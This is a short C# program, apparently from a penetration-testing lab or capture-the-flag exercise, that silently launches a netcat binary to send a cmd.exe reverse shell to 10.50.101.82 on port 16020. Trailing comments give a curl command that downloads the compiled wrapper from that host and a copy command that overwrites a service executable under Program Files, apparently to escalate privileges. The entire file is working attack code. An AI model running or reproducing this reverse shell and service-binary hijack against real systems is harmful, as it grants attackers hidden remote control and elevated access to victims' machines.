using System;
using System.Diagnostics;
namespace Wrapper{
    class Program{
        static void Main(){
            //Our code will go here!
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-AppleGamer22.exe", "10.50.101.82 16020 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
// copy C:\Users\Thomas\AppData\Local\Temp\wrapper-AppleGamer22.exe "C:\Program Files (x86)\System Explorer\System Explorer\System.exe"
// curl http://10.50.101.82/wrapper-AppleGamer22.exe -o C:\Users\Thomas\AppData\Local\Temp\wrapper-AppleGamer22.exe